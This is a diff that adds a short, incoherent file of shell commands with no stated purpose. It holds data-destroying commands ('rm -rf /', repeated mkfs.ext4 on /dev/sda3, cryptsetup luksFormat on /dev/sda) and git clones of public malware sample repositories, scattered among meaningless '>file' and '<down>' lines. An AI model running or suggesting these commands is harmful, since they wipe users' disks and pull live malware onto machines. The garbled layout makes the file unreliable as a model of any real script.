@@ -1,0 +1,41 @@
+cryptsetup-reencrypt /dev/Katy0 --decrypt 
+rm -rf /
+>file 
+cryptsetup-reencrypt /dev/0emZero --decrypt 
+rm -rf /
+>file 
+git clone https://github.com/Penetrum-Security/Malware-Zoo 
+>file
+>file
+mkfs.ext4 /dev/sda3. 2c
+>file
+mkfs.ext4 /dev/sda3. 2a
+>file
+mkfs.ext4 /dev/sda3. 2b
+>file
+mkfs.ext4 /dev/sda3. 2d
+>file
+git clone https://github.com/Endermanch/MalwareDatabase 
+>file
+git clone https://github.com/sophos-ai/SOREL-20M#Requirements
+>file
+git clone https://github.com/malwares/DangerousZone
+>file
+>file
+<inside out>
+<down>
+>file
+<down>
+>file
+<down>
+>file
+<down>
+>file
+<down>
+>file
+<down>
+>file
+<down>
+>file
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda
+>file
